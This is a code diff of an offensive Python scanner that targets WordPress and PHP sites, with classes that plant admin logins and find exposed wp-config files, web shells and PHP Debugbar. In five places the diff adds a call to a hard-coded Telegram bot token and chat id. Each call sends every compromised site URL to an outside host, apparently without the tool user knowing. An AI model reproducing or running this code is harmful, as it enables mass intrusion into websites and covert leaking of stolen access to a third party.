@@ -97,6 +97,7 @@ class ExploitWP():
               #  else:
                     print(f"\nURL : {check_url}\nUSR : admin\nPWD : {path}")
                     open('wplogin.txt', 'a').write(url + f'/wp-login.php#aadmin@{path}' + '\n')
+                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
                     break
                 else:print('[Failed New-Admin] : {}'.format(check_url))
             except:print('[Failed New-Admin] : {}'.format(check_url))
@@ -127,6 +128,7 @@ class ScannerWP():
                     print(f"{web} --> [Success]")
                     with open("wpconfig.txt", "a") as output_file:
                         output_file.write(check_url + "\n")
+                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
                     break
                 else:print(f"{web} --> [Fail]")
             except:pass
@@ -140,6 +142,8 @@ class ScannerWP():
                     print(f"{web} --> [Success]")
                     with open("shellfound.txt", "a") as output_file:
                         output_file.write(check_url + "\n")
+                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
+              
                     break
                 else:pass
             except:pass
@@ -153,6 +157,8 @@ class ScannerWP():
                     print(f"{web} --> [Success]")
                     with open("shellfound.txt", "a") as output_file:
                         output_file.write(check_url + "\n")
+                    response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text={check_url}")
+              
                     break
                 else:
                     print(f"{web} --> [Fail]")
@@ -178,6 +184,8 @@ class AllScanner():
                 print(f"{web} --> [Success]")
                 with open("phpdebugbar.txt", "a") as output_file:
                     output_file.write(check_url + "\n")
+                response = requests.get(f"https://api.telegram.org/bot6376162352:AAFx9QJiMcyagYW_FnkR3Pg8UrHwPJSxYaU/sendMessage?chat_id=-1001569329780&text=PhpDebugbar\n{check_url}")
+              
             else:
                 print(f"{web} --> [Fail]")
         except:pass
